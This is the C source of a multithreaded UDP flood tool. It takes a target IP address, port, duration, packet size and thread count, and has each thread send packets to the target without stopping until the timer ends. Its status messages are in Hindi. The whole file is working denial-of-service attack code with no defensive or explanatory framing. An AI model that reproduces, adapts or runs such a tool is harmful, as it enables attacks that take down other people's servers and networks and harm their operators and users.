#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

#define PAYLOAD_SIZE 1024  // Default payload size

// Structure to pass arguments to the thread
typedef struct {
    char *target_ip;
    int target_port;
    int packet_size;
} AttackArgs;

// Function for each thread to send UDP packets
void *send_attack(void *args) {
    AttackArgs *attack_args = (AttackArgs *)args;
    int sock;
    struct sockaddr_in target_addr;
    char *packet;

    // Create socket
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        pthread_exit(NULL);
    }

    // Configure target address
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(attack_args->target_port);
    target_addr.sin_addr.s_addr = inet_addr(attack_args->target_ip);

    // Allocate memory for payload
    packet = (char *)malloc(attack_args->packet_size);
    if (!packet) {
        close(sock);
        pthread_exit(NULL);
    }

    // Fill payload with random data
    memset(packet, rand() % 256, attack_args->packet_size);

    // Send packets indefinitely
    while (1) {
        sendto(sock, packet, attack_args->packet_size, 0,
               (struct sockaddr *)&target_addr, sizeof(target_addr));
    }

    // Cleanup
    free(packet);
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: %s <IP> <Port> <Time> <Packet Size> <Threads>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int attack_time = atoi(argv[3]);
    int packet_size = atoi(argv[4]);
    int thread_count = atoi(argv[5]);

    if (packet_size <= 0 || packet_size > PAYLOAD_SIZE) {
        return 1;
    }

    printf("Kaam chal raha hai %s:%d...\n", target_ip, target_port);

    pthread_t threads[thread_count];
    AttackArgs attack_args = {target_ip, target_port, packet_size};

    // Create threads
    for (int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, send_attack, &attack_args);
    }

    // Run for the specified duration
    sleep(attack_time);

    printf("Kaam khatam ho gaya.\n");
    return 0;
}
